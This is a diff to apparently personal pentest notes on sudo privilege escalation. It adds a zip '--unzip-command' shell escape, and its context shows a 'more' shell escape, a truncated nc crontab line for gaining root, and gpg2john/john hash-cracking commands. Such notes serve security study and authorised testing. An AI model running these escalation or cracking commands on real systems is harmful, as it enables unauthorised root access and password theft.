@@ -232,6 +232,12 @@ more
 
 <code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
 
+zip
+
+<code>touch my-bum.txt</code>
+
+<code>sudo zip my-bum.zip my-bum.txt -T --unzip-command="sh -c /bin/bash"</code>
+
 nc
 
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
@@ -275,11 +281,11 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 
 Extract crackable hash
 
-<code>/usr/sbin/gpg2john wordlist > wordlisthash-from-file</code>
+<code>gpg2john wordlist > wordlisthash-from-file</code>
 
 Crack Hash
 
-john -- wordlist=superlist.lst --format=gpg wordlisthash-from-file
+<code>john -- wordlist=superlist.lst --format=gpg wordlisthash-from-file</code>
 
 
 
